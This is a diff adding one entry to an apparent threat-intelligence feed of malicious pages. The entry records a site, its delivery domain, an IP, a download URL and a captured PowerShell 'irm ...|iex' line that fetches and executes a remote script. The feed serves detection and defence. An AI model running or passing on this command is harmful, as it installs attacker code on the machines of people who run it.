@@ -590,5 +590,27 @@
     ],
     "ReportId": "cmwqdjm5j26c90omlx8xnntmf",
     "ScannedAt": "2026-11-21T12:18:35.326000+00:00"
+  },
+  {
+    "UrlDomain": "gorettiterapie.com",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "77.37.83.147"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/7b0251a9d1cd7f8c",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/7b0251a9d1cd7f8c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/7b0251a9d1cd7f8c"
+    ],
+    "ReportId": "cmwqdyvxc26l80omlqt7iyopg",
+    "ScannedAt": "2026-11-21T12:30:27.952000+00:00"
   }
 ]
